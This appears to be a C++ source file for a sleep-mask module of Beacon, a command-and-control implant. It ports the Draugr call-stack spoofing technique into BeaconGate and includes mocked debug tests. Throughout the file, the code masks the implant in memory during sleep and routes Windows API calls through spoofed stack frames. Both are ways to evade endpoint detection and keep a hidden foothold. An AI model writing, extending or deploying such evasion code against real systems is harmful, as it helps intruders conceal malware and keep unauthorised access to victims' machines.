#include <windows.h>

#include "base\helpers.h"
#include "sleepmask.h"

/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#include "base\mock.h"
#endif

extern "C" {
#include "beacon.h"
#include "beacon_gate.h"

#include "sleepmask-vs.h"
#include "library\debug.cpp"
#include "library\extc2.cpp"
#include "library\utils.cpp"
#include "library\stdlib.cpp"
#include "library\sleep.cpp"
#include "library\masking.cpp"
#include "library\pivot.cpp"
#include "library\gate.cpp"

/**
* This is a port to BeaconGate of: https://github.com/NtDallas/Draugr.
* Only very minor changes to the original implementation have been made.
*/

// Draugr is only supported on X64.
#ifdef _WIN64
// Additional includes for draugr.
#include "library\stackspoofing.cpp"

    /**
    * Configures Draugr for use in BeaconGate.
    *
    * @param A pointer* to a DRAUGR_FUNCTION_CALL structure.
    */
    void InitializeDraugr(PDRAUGR_FUNCTION_CALL pDraugrCall) {
        // [0] Prepare spoofed stack frame struct.
        static SYNTHETIC_STACK_FRAME stackFrame;
        _memset(&stackFrame, 0, sizeof(stackFrame));

        // [1] Attempt to resolve spoofed call stack frame.
        if (!InitFrameInfo(&stackFrame)) {
            goto Cleanup;
        }

        // [2] Set target stack frame and call gate entry point.
        pDraugrCall->StackFrame = &stackFrame;
        pDraugrCall->SpoofCall = (PVOID)SpoofCall;
        DLOGF("SLEEPMASK: Successfully configured Draugr\n");

    Cleanup:
        return;
    }

    /**
    * Sleepmask-VS entry point
    *
    * Note: To enable logging for Release builds set ENABLE_LOGGING to
    * 1 in debug.h.
    */
    void sleep_mask(PSLEEPMASK_INFO info, PFUNCTION_CALL functionCall) {
        static BOOL draugrInitialized = FALSE;
        static DRAUGR_FUNCTION_CALL draugrCall;

        // [0] If logging is enabled, print relevant debug output.
#if ENABLE_LOGGING
        if (!draugrInitialized) PrintSleepMaskInfo(info);
#endif

        // [1] Initialize Draugr.
        if (!draugrInitialized) {
            InitializeDraugr(&draugrCall);
            draugrInitialized = TRUE;
        }

        // [2] Route the call.
        if (info->reason == DEFAULT_SLEEP || info->reason == PIVOT_SLEEP) {
            DLOGF("SLEEPMASK: Sleeping\n");
            //SleepMaskWrapper(info);

			DFR_LOCAL(KERNEL32, Sleep);
			// Save any custom user data prior to masking Beacon
			CUSTOM_USER_DATA customUserData;
			_memset(&customUserData, 0, sizeof(CUSTOM_USER_DATA));
			char* customUserDataPtr = BeaconGetCustomUserData();
			if (customUserDataPtr != NULL) {
				_memcpy(&customUserData, customUserDataPtr, sizeof(CUSTOM_USER_DATA));
			}
		
			// Mask Beacon
			MaskBeacon(&info->beacon_info);

			// Sleep
			if (info->reason == DEFAULT_SLEEP) {
				DLOGF("SLEEPMASK: Default sleep (HTTP/HTTPS/DNS)\n");
				//Sleep(info->sleep_time);
                FUNCTION_CALL sleepFuncCall;
                _memset(&sleepFuncCall, 0, sizeof(FUNCTION_CALL));
                sleepFuncCall.functionPtr = Sleep;
                sleepFuncCall.function = SLEEP;
                sleepFuncCall.numOfArgs = 1;
                sleepFuncCall.args[0] = info->sleep_time;
                sleepFuncCall.bMask = FALSE;

                draugrCall.FunctionCall = &sleepFuncCall;
                DraugrGateWrapper(info, &draugrCall);
                draugrCall.FunctionCall = NULL;
			}
			else if (info->reason == PIVOT_SLEEP) {
				DLOGF("SLEEPMASK: Pivot sleep (SMB/TCP)\n");
				PivotSleep(info, &customUserData);
			}

			// UnMask Beacon
			UnMaskBeacon(&info->beacon_info);
	 
        }
        else if (info->reason == BEACON_GATE) {
            // Attach the passed function call to our Draugr struct.
            draugrCall.FunctionCall = functionCall;
            DraugrGateWrapper(info, &draugrCall);
            // Null it out on exit for next time.
            draugrCall.FunctionCall = NULL;
        }

        return;
    }
}
#else
    // This is more verbose but avoids intellisense errors.
    void sleep_mask(PSLEEPMASK_INFO info, PFUNCTION_CALL functionCall) {
        if (info->reason == DEFAULT_SLEEP || info->reason == PIVOT_SLEEP) {
            DLOGF("SLEEPMASK: Sleeping\n");
            SleepMaskWrapper(info);
        }
        else if (info->reason == BEACON_GATE) {
            DLOGF("SLEEPMASK: Calling %s via BeaconGate\n", winApiArray[functionCall->function]);
            BeaconGateWrapper(info, functionCall);
        }

        return;
    }
}
#endif

// Define a main function for the debug build
#if defined(_DEBUG) && !defined(_GTEST)
#include "unit-tests\syscallapi-unit-tests.cpp"
int main(int argc, char* argv[]) {
    /**
    * [0] Run a quick test BeaconGate example.
    * Note: The GateArg() Macro ensures variadic arguments are the correct size for the architecture.
    */
    FUNCTION_CALL functionCall = bof::mock::createFunctionCallStructure(
        (PVOID)VirtualAlloc, // Function Pointer
        WinApi::VIRTUALALLOC, // Human Readable WinApi Enum
        TRUE, // Mask Beacon
        4, // Number of Arguments
        GateArg(NULL),  // VirtualAlloc Arg1
        GateArg(0x1000), // VirtualAlloc Arg2
        GateArg(MEM_RESERVE | MEM_COMMIT), // VirtualAlloc Arg3
        GateArg(PAGE_EXECUTE_READWRITE) // VirtualAlloc Arg4
    );

    bof::runMockedBeaconGate(sleep_mask, &functionCall,
        {
            .allocator = bof::profile::Allocator::VirtualAlloc,
            .obfuscate = bof::profile::Obfuscate::False,
            .useRWX = bof::profile::UseRWX::False,
            .module = "",
        });

    VirtualFree((LPVOID)functionCall.retValue, 0, MEM_RELEASE);

    // [1] Check if asm harness is passing args correctly.
    BeaconPrintf(CALLBACK_OUTPUT, "BEACONGATE: Testing args are passed correctly");
    TestArgumentsArePassedCorrectlyWrapper();

    // [2] Now test coverage for *all* supported sys calls.
    BeaconPrintf(CALLBACK_OUTPUT, "BEACONGATE: Testing all supported sys calls");
    TestSysCallApi();

    return 0;
}

// The Googletest framework is currently not compatible with clang. Therefore Sleepmask-vs does not provide support for unit tests.
#elif defined(_GTEST)
#endif
